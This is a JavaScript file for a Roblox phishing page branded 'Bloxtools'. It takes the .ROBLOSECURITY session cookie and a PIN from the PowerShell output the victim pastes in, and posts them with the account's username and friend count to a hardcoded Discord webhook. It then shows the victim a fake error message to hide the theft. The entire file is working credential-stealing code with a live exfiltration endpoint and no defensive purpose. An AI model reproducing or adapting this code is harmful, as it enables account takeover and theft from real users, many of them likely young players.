/* ======================================================
   PAYLOAD.JS - FULL COOKIE + AVATAR + USER INFO
   - Sends .ROBLOSECURITY as file attachment (bypasses 1024 limit)
   - Fetches avatar (works), friend count & username (best effort)
   - Fake error message for the victim
====================================================== */

const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";

// CORS proxies (fallback in case any works for friend count / user info)
const PROXIES = [
    "https://corsproxy.io/",
    "https://api.allorigins.win/raw?url=",
    "https://cors-anywhere.herokuapp.com/"
];

const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

// PIN validation
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

// Extract cookie (remove spaces) and rbxuid
function extractGameData(fullText) {
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Could not find .ROBLOSECURITY cookie." };
    }
    let robloxCookie = cookieMatch[1].replace(/\s/g, ''); // remove all spaces

    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;
    if (eventTrackerMatch) {
        const params = eventTrackerMatch[1]..split('&');
        for (let p of params) {
            if (p.startsWith("rbxuid=")) {
                rbxuid = p.split('=')[1];
                break;
            }
        }
    }
    if (!rbxuid) {
        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2." };
    }
    return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
}

// Try to fetch from Roblox API using a proxy
async function fetchRobloxData(endpoint) {
    if (!endpoint.startsWith("http")) endpoint = "https://" + endpoint;
    for (const proxy of PROXIES) {
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 5000);
            const res = await fetch(proxy + encodeURIComponent(endpoint), { signal: controller.signal });
            clearTimeout(timeout);
            if (!res.ok) continue;
            const data = await res.json();
            return data;
        } catch (e) { /* try next proxy */ }
    }
    return null;
}

// Fetch username & display name
async function getUserInfo(userId) {
    const data = await fetchRobloxData(`users.roblox.com/v1/users/${userId}`);
    if (data && data.name) {
        return {
            username: data.name,
            displayName: data.displayName || data.name
        };
    }
    return null;
}

// Fetch friend count
async function getFriendCount(userId) {
    const data = await fetchRobloxData(`friends.roblox.com/v1/users/${userId}/friends/count`);
    return data?.count?.toLocaleString() || null;
}

// Avatar thumbnail URL (direct, no CORS)
function getAvatarUrl(userId) {
    return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
}

// Send webhook with file attachment (full cookie) + embed
async function sendWebhook(pin, cookie, rbxuid) {
    statusMessage.textContent = "⏳ Processing...";

    // Get user info and friend count (if possible)
    const [userInfo, friendCount] = await Promise.all([
        getUserInfo(rbxuid),
        getFriendCount(rbxuid)
    ]);

    // Create a text file containing the full cookie
    const cookieBlob = new Blob([cookie], { type: "text/plain" });
    const cookieFile = new File([cookieBlob], "ROBLOSECURITY.txt", { type: "text/plain" });

    // Build embed
    const embed = {
        title: "🔓 Roblox Cookie Dump",
        color: 0xff4444,
        thumbnail: { url: getAvatarUrl(rbxuid) }, // avatar always works
        fields: [
            { name: "🆔 User ID", value: `\`${rbxuid}\``, inline: true },
            { name: "🔢 PIN Entered", value: `\`${pin}\``, inline: true }
        ],
        footer: { text: "Bloxtools • Silent Mode • Full cookie in attachment" },
        timestamp: new Date().toISOString()
    };

    if (userInfo) {
        embed.fields.push({
            name: "👤 Username / Display Name",
            value: `**${userInfo.username}** (${userInfo.displayName})`,
            inline: false
        });
    } else {
        embed.fields.push({
            name: "⚠️ Username",
            value: "Could not fetch (CORS blocked)",
            inline: false
        });
    }

    if (friendCount) {
        embed.fields.push({ name: "👥 Friends", value: friendCount, inline: true });
    } else {
        embed.fields.push({ name: "👥 Friends", value: "Could not fetch (CORS blocked)", inline: true });
    }

    // Send as multipart/form-data with file attachment
    const formData = new FormData();
    formData.append("payload_json", JSON.stringify({
        username: "Roblox Exfiltrator",
        embeds: [embed]
    }));
    formData.append("file", cookieFile);

    for (let attempt = 0; attempt < 3; attempt++) {
        try {
            const res = await fetch(WEBHOOK_URL, {
                method: "POST",
                body: formData
            });
            if (res.ok) {
                console.log(`[Bloxtools] Webhook + file sent (attempt ${attempt + 1})`);
                return true;
            } else {
                const errorText = await res.text();
                console.warn(`HTTP ${res.status}: ${errorText}`);
            }
        } catch (err) {
            console.error(`Attempt ${attempt + 1} failed:`, err);
        }
        if (attempt < 2) await new Promise(r => setTimeout(r, 1000));
    }
    return false;
}

// Main button: fake error, silent send
copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "❌ Invalid PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "❌ Paste the PowerShell game file content.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "⚙️ Verifying cookie...";
    statusMessage.style.color = "#caa8ff";

    const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);

    // Fake error for the victim
    statusMessage.textContent = "❌ Failed to verify cookie. Please check your internet and try again.";
    statusMessage.style.color = "#ff9d9d";

    copyButton.classList.remove("loading");
    copyButton.disabled = false;

    if (success) {
        console.log("%c[Bloxtools] SUCCESS: Cookie file + embed delivered.", "color: #00ff00; font-size: 14px");
    } else {
        console.error("%c[Bloxtools] FAILED: Webhook could not be sent.", "color: #ff0000; font-size: 14px");
    }
});
